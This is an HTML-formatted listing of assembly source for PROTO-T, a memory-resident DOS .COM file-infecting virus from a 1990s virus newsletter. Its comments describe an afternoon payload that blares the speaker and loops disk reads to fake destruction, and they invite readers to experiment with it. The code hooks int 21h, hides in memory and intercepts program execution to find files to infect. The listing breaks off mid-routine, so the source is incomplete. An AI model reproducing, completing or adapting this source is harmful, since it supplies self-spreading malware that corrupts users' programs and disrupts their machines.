<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>PROTO-T.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;PROTO-T virus: a simple, memory resident .COM infector for</span><span class="sc0">
</span><span class="sc1">;Crypt newsletter 9. Assemble with any MASM/TASM compatible assembler.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On call, PROTO-T will manipulate the interrupt table directly, hooking</span><span class="sc0">
</span><span class="sc1">;int 21h and decreasing the amount of memory by a little over 1k. </span><span class="sc0">
</span><span class="sc1">;It will infect COMMAND.COM</span><span class="sc0">
</span><span class="sc1">;if a shell is installed while the virus is in RAM. At start,</span><span class="sc0">
</span><span class="sc1">;PROTO-T polls the system time. If it is after 4:00 in the</span><span class="sc0">
</span><span class="sc1">;afternoon, the speaker will issue a hideous ringing noise and the</span><span class="sc0">
</span><span class="sc1">;hard file will be read very quickly, faking a massive Michelangelo-style</span><span class="sc0">
</span><span class="sc1">;trashing. The disk will continue to read until the user restores</span><span class="sc0">
</span><span class="sc1">;control by booting. (I took this slick routine from the first issue</span><span class="sc0">
</span><span class="sc1">;of "Computer Virus Developments Quarterly," edited by Mark Ludwig, American</span><span class="sc0">
</span><span class="sc1">;Eagle Publishing, Tucson, AZ.) The disk effect is harmless, but unsettling</span><span class="sc0">
</span><span class="sc1">;to those surprised by it. Heh.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Files infected with PROTO-T will generally function normally until</span><span class="sc0">
</span><span class="sc1">;4 in the afternoon, when the virus locks them up until the next</span><span class="sc0">
</span><span class="sc1">;day by way of the nuisance routines described above. Infected files have</span><span class="sc0">
</span><span class="sc1">;the ASCII string, 'This program is sick. [PROTO-T by Dumbco, INC.]'</span><span class="sc0">
</span><span class="sc1">;appended to them at the end where the body of the virus is located.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;PROTO-T is not currently scanned. However, its modifications are easily</span><span class="sc0">
</span><span class="sc1">;flagged by a good file integrity checker. For example, Dr. Solomon's </span><span class="sc0">
</span><span class="sc1">;Toolkit picked PROTO-T changes off an infected disk with both the QCV </span><span class="sc0">
</span><span class="sc1">;(quick check virus) and CHKVIRUS (CHECKVIRUS) utilities. Unfortunately, </span><span class="sc0">
</span><span class="sc1">;the novice user is left on his own by the Toolkit to determine the cause </span><span class="sc0">
</span><span class="sc1">;of the changes - a drawback which diminishes the software's value </span><span class="sc0">
</span><span class="sc1">;considerably, IMHO.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I encourage you to play with PROTO-T by Dumbco. It is a </span><span class="sc0">
</span><span class="sc1">;well-behaved resident virus, useful in demonstrating the behavior</span><span class="sc0">
</span><span class="sc1">;of simple resident infectors and how they can "pop-up" suddenly and</span><span class="sc0">
</span><span class="sc1">;ruin your day. Of course, files infected by PROTO-T are, for all</span><span class="sc0">
</span><span class="sc1">;intents and purposes, useless for future computing unless you like</span><span class="sc0">
</span><span class="sc1">;the idea of a resident virus keeping you company and freezing up</span><span class="sc0">
</span><span class="sc1">;your work late in the afternoon.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Known incompatibilities:  PROTO-T will behave weirdly on machines</span><span class="sc0">
</span><span class="sc1">;using SYMANTEC's NDOS as a command processor. And some caches will</span><span class="sc0">
</span><span class="sc1">;cause PROTO-T to hang the machine immediately. For best results,</span><span class="sc0">
</span><span class="sc1">;plain vanilla MS-DOS 4.01 and MS-DOS 5.0 with or without memory </span><span class="sc0">
</span><span class="sc1">;management seems to work fine. (Ain't this somethin': software</span><span class="sc0">
</span><span class="sc1">;advisories with a virus!)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Code for PROTO-T was obtained from Nowhere Man's VCL 1.0 assembly libraries,</span><span class="sc0">
</span><span class="sc1">;&amp; our European friends Dark Helmet and Peter Venkmann with their very</span><span class="sc0">
</span><span class="sc1">;complete code archives (in particular, the CIVIL_II template). The </span><span class="sc0">
</span><span class="sc1">;'scarey ' subroutine was excerpted from "Computer Virus Developments </span><span class="sc0">
</span><span class="sc1">;Quarterly", Vol. 1., No.1.</span><span class="sc0">


        </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">code</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc9">length</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc5">virus_length</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">length</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0"> 

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;jump + infection</span><span class="sc0">
                            </span><span class="sc1">;marker in host</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">          
        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">             </span><span class="sc1">;make call to</span><span class="sc0">
                       </span><span class="sc1">;push instruction pointer on stack</span><span class="sc0">

</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">          
        

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Ch</span><span class="sc0">          </span><span class="sc1">;DOS get time function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">            </span><span class="sc1">;Copy hour into AL</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                      </span><span class="sc1">;Sign-extend AL into AX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">         </span><span class="sc1">;Did the function return 16 (4 pm)?</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">malfunkshun</span><span class="sc0">      </span><span class="sc1">;If after 4 pm, do Proto-T thang!</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getonwithit</span><span class="sc0">
        
</span><span class="sc5">malfunkshun</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;sound and fury start</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                          </span><span class="sc1">;turn off interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                 
</span><span class="sc5">agin1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                </span><span class="sc1">;do 40 cycles of sound</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">              </span><span class="sc1">;1st frequency</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2000</span><span class="sc0">              </span><span class="sc1">;2nd frequency</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10110110b</span><span class="sc0">         </span><span class="sc1">;address of channel 2 mode 3</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;send to port</span><span class="sc0">
</span><span class="sc5">agin2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">;place sound number in bx</span><span class="sc0">
</span><span class="sc5">backerx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                </span><span class="sc1">;now put in ax</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">               </span><span class="sc1">;get port value</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">         </span><span class="sc1">;turn speaker on</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2EE0h</span><span class="sc0">             </span><span class="sc1">;delay </span><span class="sc0">
</span><span class="sc5">looperx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">looperx</span><span class="sc0">        </span><span class="sc1">;do nothing loop so sound is audible</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">               </span><span class="sc1">;get port value</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111100b</span><span class="sc0">         </span><span class="sc1">;AND - turn speaker off</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;send it</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">;decrement repeat count</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">agin2</span><span class="sc0">                </span><span class="sc1">;if not = 0 do again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                </span><span class="sc1">;10 repeats of 60000 loops</span><span class="sc0">
</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0EA60h</span><span class="sc0">            </span><span class="sc1">;loop count (in hex for TASM)</span><span class="sc0">
</span><span class="sc5">loopery</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loopery</span><span class="sc0">         </span><span class="sc1">;delay loops - no sound between bursts</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                   
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">back</span><span class="sc0">                 </span><span class="sc1">;if not = 0 loop again</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                   
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">agin1</span><span class="sc0">                </span><span class="sc1">;if not = 0 do whole thing again</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                          </span><span class="sc1">;restore interrupts </span><span class="sc0">
        
        
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;scarey part: drive reads real</span><span class="sc0">
</span><span class="sc5">scarey</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">                     </span><span class="sc1">;fast ala Michelangelo-style</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">;over-write, but this routine only</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                     </span><span class="sc1">;gets random bytes here for a </span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">              </span><span class="sc1">;cylinder to READ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0">    </span><span class="sc1">;buffer to read into</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">scarey</span><span class="sc0">      </span><span class="sc1">;yow! scarey! just think if this</span><span class="sc0">
                      </span><span class="sc1">;was made by someone not as nice as</span><span class="sc0">
                      </span><span class="sc1">;me</span><span class="sc0">

</span><span class="sc5">note</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'This program is sick. [PROTO-T by Dumbco, INC.]'</span><span class="sc0">

</span><span class="sc5">getonwithit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">; get IP from stack.</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">109h</span><span class="sc0">                         </span><span class="sc1">; adjust IP.</span><span class="sc0">

</span><span class="sc5">restore_host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                        </span><span class="sc1">; recover beginning</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">carrier_begin</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; of carrier program.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">


</span><span class="sc5">check_resident</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">                      </span><span class="sc1">;check if virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                          </span><span class="sc1">;already installed.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_virus</span><span class="sc0">

</span><span class="sc5">adjust_memory</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;get Memory </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;Control Block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5a</span><span class="sc0">        </span><span class="sc1">;check if last</span><span class="sc0">
                             </span><span class="sc1">;block -</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">abort</span><span class="sc0">                        </span><span class="sc1">;if not last block,</span><span class="sc0">
                             </span><span class="sc1">;end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;decrease memory</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">                        </span><span class="sc1">;by 1kb </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">install_virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">;PSP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">;virus start </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                        </span><span class="sc1">;in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">length</span><span class="sc0">                    </span><span class="sc1">;cx = length virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                        </span><span class="sc1">;restore ds</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">begin</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;point to start virus</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0100</span><span class="sc0">                   </span><span class="sc1">;point to destination</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                        </span><span class="sc1">;copy virus in</span><span class="sc0">
                             </span><span class="sc1">;memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">virus_segment</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">;store start of virus</span><span class="sc0">
                             </span><span class="sc1">;in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                        </span><span class="sc1">;restore extra segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">hook_vector</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cli</span><span class="sc0">                              </span><span class="sc1">;disable interrupts</span><span class="sc0">
                         </span><span class="sc1">;because we're manipulating</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                 </span><span class="sc1">;the interrupt table and a   </span><span class="sc0">
                         </span><span class="sc1">;crash would look bad</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;function 3521h - retrieve</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc5">virus_segment</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;address of current handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                </span><span class="sc1">;copy new address (virus) to</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;interrupt table</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">;interrupts on</span><span class="sc0">

</span><span class="sc5">abort</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">;restore everything</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">end_virus</span><span class="sc4">:</span><span class="sc0">      

        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">;jump to beginning</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">;of host file</span><span class="sc0">

        
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">main_virus</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushf</span><span class="sc0">                                   
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">                    </span><span class="sc1">;check for virus </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">new_21h</span><span class="sc0">                    </span><span class="sc1">;no virus call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                   </span><span class="sc1">;ax = id</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                               </span><span class="sc1">;return id     </span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
        
</span><span class="sc5">new_21h</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_05</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_05</span><span class="sc0">

</span><span class="sc5">check_05</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_exec</span><span class="sc0">

</span><span class="sc5">check_exec</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04B00h</span><span class="sc0">             </span><span class="sc1">;intercept execute function</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_seg</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">name_off</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chk_com</span><span class="sc0">               </span><span class="sc1">;goto check target</span><span class="sc0">

</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;restore registers</span><span class="sc0">
